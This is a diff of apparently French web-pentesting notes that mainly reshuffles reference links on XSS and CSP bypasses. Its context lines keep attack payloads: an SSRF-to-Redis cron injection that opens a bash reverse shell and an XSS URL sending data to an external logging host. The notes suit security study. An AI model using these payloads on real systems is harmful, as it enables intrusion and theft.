@@ -118,13 +118,6 @@ for i in {1..10000}; do curl -s -i http://site.org/index.php --data "url=http://
 dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port> 0>\x261\n\n\n"
 ```
 
-### XSS
-
-[Stored & Reflected XSS (hackndo)](https://beta.hackndo.com/attaque-xss/)
-https://brightsec.com/blog/xss/#xss-types
-https://blog.clever-age.com/fr/2014/02/10/owasp-xss-cross-site-scripting/
-https://excess-xss.com/
-
 ### XXE
   - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
  
@@ -172,16 +165,12 @@ Voir aussi `elements`
  - https://excess-xss.com/
  - https://learn-cyber.net/article/Self-XSS-Attacks
  - https://learn-cyber.net/article/Reflected-XSS-Attacks
+
  - https://javascript.info/script-async-defer
+ - https://github.com/payloadbox/xss-payload-list
  - https://github.com/cure53/HTTPLeaks/tree/main
 
 `Protection`: HTML-encode les entrées utilisateurs, CSP
-
-Analyser les tags CSP (https://csp-evaluator.withgoogle.com/) (conserver journal,désactiver cache)
-
-![csp](./csp.png)
-
-Puis envisager un [payload](https://github.com/payloadbox/xss-payload-list)
 
 `Reflected XSS`
 
@@ -199,11 +188,19 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 
 -> accès aux erreurs
 
+#### CSP
+
 [CSP Bypass](https://csplite.com/csp320/)
 
 - https://content-security-policy.com/
+- https://csp-evaluator.withgoogle.com/
 - https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
 - https://www.cobalt.io/blog/csp-and-bypasses
+- https://chromestatus.com/feature/5735596811091968
+
+Analyser les tags CSP (conserver journal,désactiver cache)
+
+![csp](./csp.png)
 
 ```bash
 # Requête complète, headers victime
